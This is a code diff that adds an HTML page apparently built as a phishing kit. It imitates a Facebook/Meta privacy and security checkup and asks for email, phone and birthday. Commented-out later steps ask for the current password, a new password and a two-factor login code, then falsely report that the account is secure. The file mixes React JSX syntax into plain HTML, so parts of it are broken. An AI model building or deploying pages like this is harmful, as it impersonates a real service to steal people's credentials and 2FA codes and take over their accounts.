@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="icon" href="./Image/icon.png" />
+    <link href="/Css/fontawesome-free-6.5.2-web/css/fontawesome.css" rel="stylesheet" />
+    <link href="/Css/fontawesome-free-6.5.2-web/css/solid.css" rel="stylesheet" />
+    <link rel="stylesheet" href="Css/privacy2.css">
+    <link rel="stylesheet" href="Css/body.css">
+</head>
+<body>
+    <div class="step-container">
+        <div class="multi-step-form">
+            <div class="active">
+                <div class="mobile_header">
+                    <link to="/privacy" class="back_header">
+                        <i class="icon-back"></i>
+                    </link>
+                    <div class="title_header">
+                        <span>Personal</span>
+                    </div>
+                    <div class="back_header"></div>
+                </div>
+                <div class="title2">
+                    <div class="icon-wrapper">
+                        <link to="/privacy">
+                            <i class="icon-back"></i>
+                        </link>
+                    </div>
+                    <span>Check your account infomation?</span>
+                </div>
+                <hr />
+                <div class="text-info">
+                    <h2>Personal details</h2>
+                    <p>
+                        Meta uses this information to verify your identity
+                        and to keep our community safe. You decide what
+                        personal details you make visible to others.
+                    </p>
+                </div>
+                <div class="contact_infomation">
+                    <div class="contact_infomation_wrapper">
+                        <div class="contact_infomation_title">
+                            <span>Is this your contact infomation?</span>
+                        </div>
+                        <div class="contact_infomation_text">
+                            <div class="contact_text_item">
+                                <div class="contact_text_item_title">
+                                    <span
+                                        style="
+                                            font-size: 20px;
+                                            color: #484848;
+                                        "
+                                    >
+                                        •
+                                    </span>
+                                    <p>Contact Info</p>
+                                </div>
+                                <p class="contact_text_item_text">
+                                    Batmanuniver@gmail.com
+                                </p>
+                                <p class="contact_text_item_text">
+                                    +(323) 990 0052
+                                </p>
+                            </div>
+                            <div class="contact_text_item">
+                                <div class="contact_text_item_title">
+                                    <span
+                                        style="
+                                            font-size: 20px;
+                                            color: #484848
+                                        "
+                                    >
+                                        •
+                                    </span>
+                                    <p>Birthday</p>
+                                </div>
+                                <p class="contact_text_item_text">
+                                    December 22, 1999
+                                </p>
+                            </div>
+                        </div>
+                        <p class="contact_text_desc">
+                            Is this your contact information, if not please
+                            fill out the form below with the correct contact
+                            information
+                        </p>
+                    </div>
+                </div>
+
+                <div class="contact_form_container">
+                    <div class="contact_form_wrapper">
+                        <h3>Personal infomation change form</h3>
+                    </div>
+                    <form class="form_contact" onSubmit={nextStep}>
+                        <div class="form_contact_item">
+                            <svg  viewBox="0 0 512 512" stroke-width="2" width="17" height="17" fill="#5c5e61" xmlns="http://www.w3.org/2000/svg"><path d="m464 64h-416c-26.51 0-48 21.49-48 48v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48v-288c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701-76.407-59.83-112.162-88.228-134.587-106.49v-40.805zm-416 288v-185.602c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653v185.601z"/></svg>
+                            <input
+                                type="text"
+                                placeholder="Add email"
+                                name="email"
+                                class="input_form"
+                                onChange={handChangeInput}
+                                />
+                        </div>
+                        <!-- {errors.email && (
+                            <p class="isValid">{errors.email}</p>
+                        )} -->
+                        <div class="form_contact_item" style="gap:14px">
+                            <svg  viewBox="0 0 512 512" stroke-width="2" width="18" height="18" fill="#5c5e61" xmlns="http://www.w3.org/2000/svg"><path d="m391 480c-19.52 0-46.94-7.06-88-30-49.93-28-88.55-53.85-138.21-103.38-47.88-47.85-71.18-78.83-103.79-138.17-36.84-67-30.56-102.12-23.54-117.13 8.36-17.94 20.7-28.67 36.65-39.32a176.3 176.3 0 0 1 28.64-15.2c1-.43 1.93-.84 2.76-1.21 4.95-2.23 12.45-5.6 21.95-2 6.34 2.38 12 7.25 20.86 16 18.17 17.92 43 57.83 52.16 77.43 6.15 13.21 10.22 21.93 10.23 31.71 0 11.45-5.76 20.28-12.75 29.81-1.31 1.79-2.61 3.5-3.87 5.16-7.61 10-9.28 12.89-8.18 18.05 2.23 10.37 18.86 41.24 46.19 68.51s57.31 42.85 67.72 45.07c5.38 1.15 8.33-.59 18.65-8.47 1.48-1.13 3-2.3 4.59-3.47 10.66-7.93 19.08-13.54 30.26-13.54h.06c9.73 0 18.06 4.22 31.86 11.18 18 9.08 59.11 33.59 77.14 51.78 8.77 8.84 13.66 14.48 16.05 20.81 3.6 9.53.21 17-2 22-.37.83-.78 1.74-1.21 2.75a176.49 176.49 0 0 1 -15.29 28.58c-10.63 15.9-21.4 28.21-39.38 36.58a67.42 67.42 0 0 1 -29.55 6.47z"/></svg>
+                            <div  style="display: flex; gap: 4px">
+                                <select class="phone-select-custom"  style="border: none; width: 18px;">
+                                    <option style="height: 50px;" value="+380">Ukraine +380</option>
+                                    <option value="+93">Albania +355</option>
+                                    <option value="Angola">Angola +244</option>
+                                    <option value="volvo">Brazil +55</option>
+                                </select>
+                                <input
+                                    type="input"
+                                    placeholder="Add phone number"
+                                    name="birthday"
+                                    class="input_form input-date phone-input-custom"
+                                    />
+                            </div>
+                        </div>
+                        <!-- {errors.phone && (
+                            <p class="isValid">{errors.phone}</p>
+                        )} -->
+                        <div class="form_contact_item">
+                            <!-- <IoCalendarOutline class="form_item_icon" /> -->
+
+                            <svg viewBox="0 0 512 512" stroke-width="0" width="20" height="20" fill="#5c5e61" xmlns="http://www.w3.org/2000/svg"><rect fill="none" height="384" rx="48" stroke="#000" stroke-linejoin="round" stroke-width="32" width="416" x="48" y="80"/><circle cx="296" cy="232" r="24"/><circle cx="376" cy="232" r="24"/><circle cx="296" cy="312" r="24"/><circle cx="376" cy="312" r="24"/><circle cx="136" cy="312" r="24"/><circle cx="216" cy="312" r="24"/><circle cx="136" cy="392" r="24"/><circle cx="216" cy="392" r="24"/><circle cx="296" cy="392" r="24"/><g fill="none" stroke="#000" stroke-linejoin="round" stroke-width="32"><path d="m128 48v32" stroke-linecap="round"/><path d="m384 48v32" stroke-linecap="round"/><path d="m464 160h-416"/></g></svg>
+                            <input
+                                type="date"
+                                placeholder="Add birthday"
+                                name="birthday"
+                                class="input_form input-date"
+                            />
+                        </div>
+                        <!-- {errors.birthday && (
+                            <p class="isValid">{errors.birthday}</p>
+                        )} -->
+                    </form>
+                </div>
+
+                <div class="progressBar">
+                    <div
+                        style=" width: 25%"
+                        class="progress"
+                    ></div>
+                </div>
+
+                <div class="event_button_container">
+                    <div class="event_button_wrapper">
+                        <!-- <div class="progressBar_mobile">
+                            {[...Array(4)].map((_, index) => (
+                                <div
+                                    key={index}
+                                    class={`dot_mobile ${
+                                        index === currentStep - 1
+                                            ? "active"
+                                            : ""
+                                    }`}
+                                />
+                            ))}
+                        </div> -->
+                        <span class="event_back" to="/privacy">
+                            Back
+                        </span>
+                        <button
+                            class="event_continue"
+                            onClick={nextStep}
+                        >
+                            Skip
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <!-- <div class={`step ${currentStep === 2 ? "active" : ""}`}>
+                <div class="mobile_header">
+                    <button class="back_header" onClick={prevStep}>
+                        <i class="icon-back"></i>
+                    </button>
+                    <div class="title_header">
+                        <span>Password</span>
+                    </div>
+                    <div class="back_header"></div>
+                </div>
+                <div class="title2">
+                    <div class="icon-wrapper">
+                        <button
+                            class="event_back_step"
+                            onClick={prevStep}
+                        >
+                            <i class="icon-back"></i>
+                        </button>
+                    </div>
+                    <span>Is your password private?</span>
+                </div>
+                <hr />
+                {isChangePassSuccess && (
+                    <div class="text-info">
+                        <h2>Is your password private?</h2>
+                        <p>
+                            If your Facebook password is used eisewhere
+                            online then your account may be less secure.
+                            Protect yourself and your Facebook friends by
+                            choosing a stronger password.
+                        </p>
+                    </div>
+                )}
+
+                {isChangePassSuccess && (
+                    <div
+                        class={`tip_password_container  ${
+                            isMobile ? "block" : ""
+                        }`}
+                    >
+                        <div class="tip_password_wrapper">
+                            <div class="icon_tip">
+                                <i class="light"></i>
+                                <span>Password tips</span>
+                            </div>
+                            <div class="tip_text_wrapper">
+                                <div class="tip_text_item">
+                                    <span>•</span>
+                                    <p>
+                                        Choose a password that you don't use
+                                        anywhere else online.
+                                    </p>
+                                </div>
+                                <div class="tip_text_item">
+                                    <span>•</span>
+                                    <p>
+                                        Make it easy for you to remember and
+                                        difficult for others to guess.
+                                    </p>
+                                </div>
+                                <div class="tip_text_item">
+                                    <span>•</span>
+                                    <p>
+                                        Never share your password with
+                                        anyone.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                )}
+
+                {isChangePassSuccess && (
+                    <div class="contact_form_container">
+                        <div class="form_contact_password">
+                            <div class="form_contact_item">
+                                <RiShieldKeyholeLine class="form_item_icon" />
+                                <input
+                                    type="password"
+                                    name="currentPassword"
+                                    value={valuePassword.currentPassword}
+                                    placeholder="Current password"
+                                    onChange={handleChangeInputPassword}
+                                />
+                            </div>
+                            {errorsPassword.currentPassword && (
+                                <p class="isValid">
+                                    {errorsPassword.currentPassword}
+                                </p>
+                            )}
+                            <div class="form_contact_item">
+                                <LuKeyRound
+                                    class="form_item_icon"
+                                    style={{ transform: "rotate(180deg)" }}
+                                />
+                                <input
+                                    type="password"
+                                    name="newPassword"
+                                    value={valuePassword.newPassword}
+                                    placeholder="New password"
+                                    onChange={handleChangeInputPassword}
+                                />
+                            </div>
+                            {errorsPassword.newPassword && (
+                                <p class="isValid">
+                                    {errorsPassword.newPassword}
+                                </p>
+                            )}
+                            <div class="form_contact_item">
+                                <LuKeyRound
+                                    class="form_item_icon"
+                                    style={{ transform: "rotate(180deg)" }}
+                                />
+                                <input
+                                    type="password"
+                                    name="re_newPassword"
+                                    value={valuePassword.re_newPassword}
+                                    placeholder="Re-type new password"
+                                    onChange={handleChangeInputPassword}
+                                />
+                            </div>
+                            {errorsPassword.re_newPassword && (
+                                <p class="isValid">
+                                    {errorsPassword.re_newPassword}
+                                </p>
+                            )}
+                        </div>
+                    </div>
+                )}
+                {isChangePassSuccess && (
+                    <div class="change_password">
+                        <button
+                            onClick={handleSavePassword}
+                            class={`button_change_password ${
+                                loading ? "loading-button" : ""
+                            }`}
+                            disabled={loading}
+                        >
+                            {loading && <div class="spinner"></div>}
+                            <span
+                                class={`button-text ${
+                                    loading ? "loading" : ""
+                                }`}
+                            >
+                                Save changes
+                            </span>
+                        </button>
+                    </div>
+                )}
+
+                {isChangePassSuccess && (
+                    <div class="forgot_password">
+                        <Link
+                            to="/recover/initiate"
+                            class="button_forgot_password"
+                            state={{ values: values ? values : valuesPass }}
+                            setCurrentStep = {setCurrentStep}
+                            currentStep = {currentStep}
+                        >
+                            <span>Forgot your password?</span>
+                        </Link>
+                    </div>
+                )}
+
+                {!isChangePassSuccess && (
+                    <div class="change_pass_success">
+                        <h2>Password updated successfully</h2>
+                        <span>
+                            Remember to use your new password next time you
+                            log in. You can change your password at any time
+                            in your account settings.
+                        </span>
+                    </div>
+                )}
+                {!isChangePassSuccess && (
+                    <div class="img_change_pass_success">
+                        <i class="icon_change_pass_success"></i>
+                    </div>
+                )}
+
+                <div class="progressBar">
+                    <div
+                        style={{ width: `${progressBarWidth}%` }}
+                        class="progress"
+                    />
+                </div>
+
+                <div class="event_button_container">
+                    <div class="event_button_wrapper">
+                        <div class="progressBar_mobile">
+                            {[...Array(4)].map((_, index) => (
+                                <div
+                                    key={index}
+                                    class={`dot_mobile ${
+                                        index === currentStep - 1
+                                            ? "active"
+                                            : ""
+                                    }`}
+                                />
+                            ))}
+                        </div>
+                        <button class="event_back" onClick={prevStep}>
+                            Back
+                        </button>
+                        <button
+                            class="event_continue"
+                            onClick={
+                                isChangePassSuccess
+                                    ? handleSavePassword
+                                    : nextStep
+                            }
+                        >
+                            Skip
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <div class={`step ${currentStep === 3 ? "active" : ""}`}>
+                <div class="account_security">
+                    <div class="mobile_header">
+                        <button class="back_header" onClick={prevStep}>
+                            <i class="icon-back"></i>
+                        </button>
+                        <div class="title_header">
+                            <span>Two-factor authentication</span>
+                        </div>
+                        <div class="back_header"></div>
+                    </div>
+                    <div class="title2">
+                        <div class="icon-wrapper">
+                            <button
+                                class="event_back_step"
+                                onClick={prevStep}
+                            >
+                                <i class="icon-back"></i>
+                            </button>
+                        </div>
+                        <span>Enhance account security</span>
+                    </div>
+                    <hr />
+                    <div class="text-info">
+                        <h3>Choose a way to confirm that it's you</h3>
+                        <div class="hr_block"></div>
+                        <p class="desc_text">
+                            Your account has two-factor authentication
+                            switched on, which requires this extra login
+                            step.
+                        </p>
+                        <div class="hr_block"></div>
+                        <h4 style={{ paddingTop: "16px" }}>
+                            Approve from another device
+                        </h4>
+                        <p class="desc_text">
+                            We sent a notification to your logged-in devices
+                            Max. Check your Facebook notifications there and
+                            approve the login to continue.
+                        </p>
+                        <div class="hr_block"></div>
+                        <h4 style={{ paddingTop: "16px" }}>
+                            Or, enter your login code
+                        </h4>
+                        <p
+                            class="desc_text"
+                            style={{ paddingBottom: "0px" }}
+                        >
+                            Enter the 6-digit code from the authentication
+                            app that you set up.
+                        </p>
+                    </div>
+
+                    <div class="login_code">
+                        <div class="login_code_wrapper">
+                            <input
+                                type="text"
+                                value={valueCode}
+                                placeholder="Login Code"
+                                onChange={handleChangeLoginCode}
+                            />
+                        </div>
+                    </div>
+                    {errorsLoginCode && (
+                        <p
+                            class="isValid"
+                            style={{ paddingLeft: "16px" }}
+                        >
+                            {errorsLoginCode}
+                        </p>
+                    )}
+                    <div
+                        class="change_password"
+                        style={{ margin: "0px" }}
+                    >
+                        <button
+                            onClick={handleContinueLoginCode}
+                            class={`button_change_password ${
+                                loadingCode ? "loading-button" : ""
+                            }`}
+                            disabled={loadingCode}
+                            style={{ marginBottom: "0px" }}
+                        >
+                            {loadingCode && <div class="spinner"></div>}
+                            <span
+                                class={`button-text ${
+                                    loadingCode ? "loading" : ""
+                                }`}
+                            >
+                                Continue
+                            </span>
+                        </button>
+                    </div>
+                    <div class="reset_code">
+                        <button
+                            class={`button_reset_code ${
+                                seconds > 0 ? "active_resend_code" : ""
+                            }`}
+                            onClick={handleResendCode}
+                            disabled={seconds > 0}
+                        >
+                            <span>Resend code?</span>
+                        </button>
+                        <span class="watting_time">
+                            {seconds > 0 ? `${seconds}s` : ""}
+                        </span>
+                    </div>
+                    <div class="progressBar">
+                        <div
+                            style={{ width: `${progressBarWidth}%` }}
+                            class="progress"
+                        />
+                    </div>
+                    <div class="event_button_container">
+                        <div class="event_button_wrapper">
+                            <div class="progressBar_mobile">
+                                {[...Array(4)].map((_, index) => (
+                                    <div
+                                        key={index}
+                                        class={`dot_mobile ${
+                                            index === currentStep - 1
+                                                ? "active"
+                                                : ""
+                                        }`}
+                                    />
+                                ))}
+                            </div>
+                            <button
+                                class="event_back"
+                                onClick={prevStep}
+                            >
+                                Back
+                            </button>
+                            <button
+                                class="event_continue"
+                                onClick={handleContinueLoginCode}
+                            >
+                                Skip
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div className="loginCodeFailed"></div>
+            </div>
+            <div className={`step ${currentStep === 4 ? "active" : ""}`}>
+                <div className="mobile_header">
+                    <button className="back_header" onClick={prevStep}>
+                        <i className="icon-back"></i>
+                    </button>
+                    <div className="title_header">
+                        <span>Login alerts</span>
+                    </div>
+                    <div className="back_header"></div>
+                </div>
+                <div className="title2">
+                    <div className="icon-wrapper">
+                        <button
+                            className="event_back_step"
+                            onClick={prevStep}
+                        >
+                            <i className="icon-back"></i>
+                        </button>
+                    </div>
+                    <span>Bật cảnh báo</span>
+                </div>
+                <hr />
+                <div className="text-info">
+                    <h2>Control your alerts</h2>
+                    <p>
+                        Tel us how to notify you if someone logs into your
+                        account from a place we don't recognize. We'll tell
+                        you which device was used and where it's located
+                    </p>
+                </div>
+
+                <div className="send_notifycation_container">
+                    <div className="send_notifycation_wrapper">
+                        <div className="item_noti">
+                            <div className="item_noti_icon">
+                                <i className="icon_facebook"></i>
+                            </div>
+                            <div className="item_noti_text">
+                                <p>Facebook</p>
+                                <span>
+                                    We'll send you a Facebook notification
+                                </span>
+                            </div>
+                            <div className="multi__language">
+                                <input
+                                    type="checkbox"
+                                    className="lang__check"
+                                    checked={isChecked}
+                                    onChange={handleChange}
+                                />
+                            </div>
+                        </div>
+                        <div className="item_noti">
+                            <div className="item_noti_icon">
+                                <i className="icon_email"></i>
+                            </div>
+                            <div className="item_noti_text">
+                                <p>Email</p>
+                                <span>
+                                    We'll send an alert to {values.email}
+                                </span>
+                            </div>
+                            <div className="multi__language">
+                                <input
+                                    type="checkbox"
+                                    className="lang__check"
+                                    checked={isCheckedEmail}
+                                    onChange={handleChangeEmail}
+                                />
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div className="progressBar">
+                    <div
+                        style={{ width: `${progressBarWidth}%` }}
+                        className="progress"
+                    />
+                </div>
+                <div className="event_button_container">
+                    <div className="event_button_wrapper">
+                        <div className="progressBar_mobile">
+                            {[...Array(4)].map((_, index) => (
+                                <div
+                                    key={index}
+                                    className={`dot_mobile ${
+                                        index === currentStep - 1
+                                            ? "active"
+                                            : ""
+                                    }`}
+                                />
+                            ))}
+                        </div>
+                        <button className="event_back" onClick={prevStep}>
+                            Back
+                        </button>
+                        <button
+                            className="event_continue"
+                            onClick={nextStep}
+                        >
+                            Next
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <div className={`step ${currentStep === 5 ? "active" : ""}`}>
+                <div className="mobile_header">
+                    <button className="back_header" onClick={prevStep}>
+                        <i className="icon-back"></i>
+                    </button>
+                    <div className="title_header">
+                        <span></span>
+                    </div>
+                    <div className="back_header"></div>
+                </div>
+                <div className="title2">
+                    <div className="icon-wrapper">
+                        <button
+                            className="event_back_step"
+                            onClick={prevStep}
+                        >
+                            <i className="icon-back"></i>
+                        </button>
+                    </div>
+                    <span></span>
+                </div>
+                <div className="sucess_icon_privacy_container">
+                    <div className="sucess_icon_privacy_wrapper">
+                        <i className="icon_sucess"></i>
+                        <span>You're all set</span>
+                    </div>
+                </div>
+                <div className="text-info-sucess">
+                    <p>
+                        Thank you for reviewing your security options. You
+                        can change these options anytime from your settings.
+                    </p>
+                </div>
+
+                <div className="privacy-list">
+                    <div className="wrapper_icon">
+                        <i className="icon4"></i>
+                    </div>
+                    <div className="wrapper_text">
+                        <span className="text">Your password is OK</span>
+                    </div>
+                </div>
+                <div className="privacy-list">
+                    <div className="wrapper_icon">
+                        <i className="icon4"></i>
+                    </div>
+                    <div className="wrapper_text">
+                        <span className="text">
+                            Two-factor authentication is on
+                        </span>
+                    </div>
+                </div>
+                <div className="privacy-list">
+                    <div className="wrapper_icon">
+                        <i className="icon4"></i>
+                    </div>
+                    <div className="wrapper_text">
+                        <span className="text">Login alerts are on</span>
+                    </div>
+                </div>
+
+                <div className="continue">
+                    <a
+                        href="https://facebook.com"
+                        className="button_continue"
+                    >
+                        <span>Review another topic</span>
+                    </a>
+                </div>
+            </div> -->
+        </div>
+    </div>
+</body>
+</html>
